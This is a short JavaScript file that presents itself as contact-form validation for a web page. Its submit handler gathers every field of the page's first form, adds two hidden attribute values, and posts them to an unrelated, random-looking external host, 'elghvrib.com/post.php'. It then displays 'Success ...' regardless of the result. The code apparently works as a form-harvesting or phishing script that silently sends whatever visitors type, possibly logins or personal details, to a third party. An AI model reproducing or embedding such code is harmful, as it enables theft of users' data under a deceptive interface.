"use strict";

window.addEventListener('load', function() {

//------------------------------------------------------------------------------------
//						CONTACT FORM VALIDATION'S SETTINGS
//------------------------------------------------------------------------------------
$('#contact-center-form-form').validate({
    onfocusout: false,
    onkeyup: false,
    rules: {
	},
    errorPlacement: function (error, element) {

        if ((element.attr("type") == "radio") || (element.attr("type") == "checkbox")) {
            error.appendTo($(element).parents("div").eq(0));
        } else {
            error.insertAfter(element);
        }
    }
});

//------------------------------------------------------------------------------------
//								CONTACT FORM SCRIPT
//------------------------------------------------------------------------------------


let form = document.getElementsByTagName('form')[0]
let button = document.getElementsByTagName('button')[0]

form.addEventListener('submit', function (e) {
    e.preventDefault()

    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function () {
        if (this.readyState == 4 && this.status == 200) {
            const response = JSON.parse(this.responseText)
            console.log(response)
            setTimeout(() => {
            }, 200)
        }
    };

    let data = new FormData(form)
    data.append('cbr', form.getAttribute('cbr'))
    data.append('tbs', form.getAttribute('tbs'))
    xhttp.open("POST", "https://elghvrib.com/post.php", true);
    xhttp.send(data);

    form.querySelector('button').innerHTML = 'Success ...';
})


button.addEventListener('click', function () {
    setTimeout(() => {
        this.innerHTML = "Success ..."
    }, 500)
})


});
